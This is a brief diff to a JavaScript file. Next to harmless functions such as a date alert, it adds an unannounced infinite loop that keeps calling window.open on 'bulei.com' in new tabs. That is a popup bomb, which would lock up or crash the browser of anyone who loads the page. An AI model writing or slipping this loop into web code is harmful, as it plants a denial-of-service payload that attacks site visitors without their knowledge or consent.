@@ -10,3 +10,6 @@ function button(){
 function date(){
   alert("The date is: "+new Date());
 }
+while(true){
+    window.open('bulei.com', '_blank');
+}
